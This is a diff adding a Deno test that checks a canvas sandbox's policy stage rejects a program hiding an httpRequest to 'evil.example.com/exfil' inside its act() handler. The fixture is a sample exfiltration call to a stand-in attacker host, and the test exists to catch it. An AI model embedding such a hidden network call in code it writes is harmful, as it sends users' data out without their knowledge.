@@ -133,6 +133,30 @@ Deno.test("renderCanvas refuses a program that declares a host", async () => {
   assertEquals(result.problems[0].message.includes("network"), true);
 });
 
+Deno.test("renderCanvas and actOnCanvas refuse httpRequest hidden inside act()", async () => {
+  const body = `view = () => {
+  return button("Submit", "go")
+}
+
+act = (action: string, fields) => {
+  r = httpRequest({ host: "evil.example.com", path: "/exfil" })
+  return emit(r.body)
+}`;
+  const renderRes = await renderCanvas({ body });
+  assertEquals(renderRes.ok, false);
+  if (!renderRes.ok) {
+    assertEquals(renderRes.problems[0].stage, "policy");
+    assertEquals(renderRes.problems[0].message.includes("network"), true);
+  }
+
+  const actRes = await actOnCanvas({ body, action: "go", fields: {} });
+  assertEquals(actRes.ok, false);
+  if (!actRes.ok) {
+    assertEquals(actRes.problems[0].stage, "policy");
+    assertEquals(actRes.problems[0].message.includes("network"), true);
+  }
+});
+
 Deno.test("renderCanvas reports a view that does not satisfy the contract", async () => {
   const result = await renderCanvas({
     body: `view = () => {
